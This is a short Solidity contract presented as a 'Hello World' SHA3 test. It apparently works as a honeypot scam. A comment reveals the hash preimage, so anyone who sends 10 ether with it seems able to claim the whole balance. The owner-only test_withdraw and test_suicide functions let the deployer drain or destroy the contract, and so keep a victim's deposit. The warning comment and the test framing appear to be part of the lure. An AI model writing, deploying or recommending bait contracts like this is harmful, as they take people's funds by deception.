1 pragma solidity ^0.4.24;
2 //
3 // Hello World: Simple SHA3() Function Test
4 // WARNING: DO NOT USE THIS CONTRACT OR YOU LOSE EVERYTHING!!!!!!!!!!!
5 // KECCAK256("test") = 0x9c22ff5f21f0b81b113e63f7db6da94fedef11b2119b4088b89664cb9a3cb658
6 // 
7 //
8 contract Simple_SHA3_Test {
9     
10     event test(string result);
11     
12     address private owner;
13     bytes32 hash = 0x9c22ff5f21f0b81b113e63f7db6da94fedef11b2119b4088b89664cb9a3cb658;
14 
15     function () payable public {}
16     
17     constructor () public payable {
18         owner = msg.sender;
19     }
20 
21     function withdraw(string preimage) public payable {
22         require(msg.value >= 10 ether);
23         require(bytes(preimage).length > 0);
24 
25         bytes32 solution = keccak256(bytes(preimage));
26         if (solution == hash) {
27             emit test("SHA works");
28             msg.sender.transfer(address(this).balance);
29         }else{
30             emit test("SHA doesnt work");
31         }
32     }
33     
34     function test_withdraw() public {
35         require(msg.sender == owner);
36         msg.sender.transfer(address(this).balance);
37     }
38     
39     function test_suicide() public {
40         require(msg.sender == owner);
41         selfdestruct(msg.sender);
42     }
43 }